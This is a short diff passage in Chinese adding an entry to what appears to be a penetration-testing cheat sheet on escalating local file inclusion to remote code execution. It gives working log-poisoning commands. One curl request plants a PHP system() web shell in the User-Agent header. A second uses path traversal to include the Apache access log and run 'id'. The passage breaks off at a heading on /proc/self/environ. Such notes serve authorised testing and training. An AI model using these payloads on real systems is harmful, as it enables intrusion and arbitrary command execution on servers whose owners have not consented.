+
+**4. LFI到RCE升级**  _[linux]_
+_将文件包含(LFI)升级为远程代码执行(RCE)_
+```
+# 1. 日志文件包含(Log Poisoning):
+curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
+curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"
+
+# 2. /proc/self/environ包含:
